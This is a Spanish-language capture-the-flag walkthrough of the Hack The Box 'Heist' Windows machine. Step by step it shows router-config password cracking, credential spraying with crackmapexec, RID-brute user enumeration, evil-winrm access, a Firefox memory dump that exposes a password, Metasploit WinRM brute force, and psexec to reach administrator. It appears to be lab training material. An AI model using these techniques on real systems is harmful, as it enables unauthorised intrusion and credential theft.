Maquina: Windows
Level: Easy
IP: 10.10.10.149


Herramientas a utilizar:

- nmap
- jhon = John the Ripper
- Link:
-  - https://packetlife.net/toolbox/type7/
-  - https://github.com/Hackplayers/evil-winrm
-  - https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
- crackmapexec
- smbmap
- sysinternals
- msfconsole = metaexploit
- psexec.p


# nmap -sC -sV -o scan_heist.txt 10.10.10.149

Encontraremos los siguiente puertos abierto.

80 http
135
445 smb

Como siempre primero iniciaremos a enumerar por el puerto 80

# http://10.10.10.149/

aqui tenemos un login, pero si nos fijamos bien tenemos un acceso de invitado, el cual nos llevara a
http://10.10.10.149/attachments/config.txt

Este archivo contiene blog con un archivo de configuracion de un router en el cual veremos varios password.

secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
username rout3r password 7 0242114B0E143F015F5D1E161713 
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408

Con el primero haremos fuerza bruta, creamos un archivo llamado hashespass.txt y en el colocamos: 
enable_secret:$1$pdQG$o8nrSzsGXeaduXrjlvKc91

# john --wordlist=/usr/share/wordlists/rockyou.txt hashespass.txt

Nuestro resultado sera: stealth1agent    (enable_secret)

Con los demas iremos al siguiente link https://packetlife.net/toolbox/type7/
user: rout3r pass: $uperP@ssword
user: admin pass: Q4)sJu\Y8qz*A3?d

Para probar lo que ya tenemos utilizaremos crackmapexec primero creamos un archivo con user y otro con los pass.

# crackmapexec smb 10.10.10.149 -u user -p pass

Veremos que el siguiente usuario si funciono:
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent

ahora utilizaremos smbmap para ver que nivel tenemos con el usuario hazard

# smbmap -H 10.10.10.149 -u hazard -p stealth1agent
notamos que solo tenemos acceso read only remote ipc

# rpcclient -U 'hazard%stealth1agent' 10.10.10.149
# rpcclient $> lookupnames hazard

Nuestro output sera: hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
Ahora tenemos el siguiente output
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)

Con esta informacion ahora podemos hacer fuerza bruta con el SID para ver todos los usuarios, desde nuestra terminal ejecutamos.

# rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c 'lookupsids S-1-5-21-4254423774-1266059056-3197185112-1000'

Si todo va bien tenemos una output: S-1-5-21-4254423774-1266059056-3197185112-1000 *unknown*\*unknown* (8)

Por lo que ahora haremos una funcion para ver todo los posible SID y removiendo los unknown.

# for i in {1000..1050}; do rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c "lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i" | grep -v unknown; done

Con esto veremos varios usuarios 2 usuarios que tenemos en nuestro listado de user.
Nota: si el evil-winrm no funciona instala estas dependencia: gem install winrm winrm-fs colorize stringio

# ruby evil-winrm/evil-winrm.rb -i 10.10.10.149 -u SUPPORTDESK\\chase -p 'Q4)sJu\Y8qz*A3?d'

Aqui tendremos acceso a heist con el usuario chase, como veremos estamos en la carpeta documentos solo debemos ir a desktop para optener la flag.

Ahora continuando con la enumeracion encontramos que en 
C:\inetpub\wwwroot> 
Existe dos archivos error.php y login.php en login.php vemos un:
hash: 91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040
user: admin@support.htb

john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hash_admin.txt
y no encontramos nada. por lo que continuaremos.

Ahora nos iremos desde heist logueado con el usuario chase a la siguiente ruta
c:\Program Files> aqui ejecutamos Get-Process.

y copiaremos los process de Firefox que estan corriendo

408      31    17404      63308       2.17   2768   1 firefox
    390      32    43244      75072      57.30   4728   1 firefox
    358      27    16364      37608       0.58   6808   1 firefox
   1151      70   132720     204480      28.55   6924   1 firefox
    343      20     9976      37300       0.33   7052   1 firefox
    
 Ahora descargaremos systeminternal https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
unzip sysinternals-suite
copiamos el procdump64.exe al directorio heist

volvemos acceder a heist con el usuario chase y subimos el procdump64.exe

# upload <ruta completa del procdump64.exe>
# .\procdump64.exe -accepteula
# .\procdump64.exe -ma 4728 <4728 es el id_proc firefox que encontramos>.
Esto genera un archivo firefox.exe_<fechayhora>.dmp el cual deberemos descargar.
download firefox.exe_2102209_003234.dmp

mientras se esta descargado con otra shell vamos hacer la siguiente busqueda.

strings firefox.exe_210209_003234.dmp |grep admin@support.htb

y con esto veremos password del admin@support.htb el es XXXXXXXXX
actualizamos los archivo user: con admin@support.htb y el pass con XXXXXXXXX
volvemos a probar con crackmapexec

crackmapexec smb 10.10.10.149 -u user -p pass

si no tenemos resultado utilizaremos metaexploit

msfconsole
use auxiliary/scanner/winrm/winrm_login
set pass_file /home/r0ok1e/Downloads/htb/machine/heist/pass
set user_file /home/r0ok1e/Downloads/htb/machine/heist/users
set rhost 10.10.10.149
run

y aqui veremos que funciona user/pass chase y administrator

para poder acceder con esta nuevas credenciales solo deberemos hacer lo siguiente:

locate psexec.p
python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.149

Listo, solo es ir a Desktop del administrator y tenemos root.txt y nuestra flag
